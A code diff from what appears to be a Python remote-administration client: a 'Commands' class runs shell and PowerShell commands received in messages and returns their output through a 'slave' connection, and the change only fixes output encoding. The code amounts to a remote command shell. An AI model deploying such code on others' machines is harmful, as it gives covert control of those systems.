@@ -53,13 +53,13 @@ class Commands:
         self.slave.send_dict(msg)
     
     def cmd(self, msg):
-        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
-        output = res.stdout.read().decode('utf-8')
+        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE, encoding='oem')
+        output = res.stdout.read()
         self.slave.send_dict({'cmd_output': output})
     
     def powershell(self, msg):
-        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE, executable=r'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe')
-        output = res.stdout.read().decode('utf-8')
+        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE, executable=r'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', encoding='oem')
+        output = res.stdout.read()
         self.slave.send_dict({'powershell_output': output})
     
     def recieve_file(self, msg):
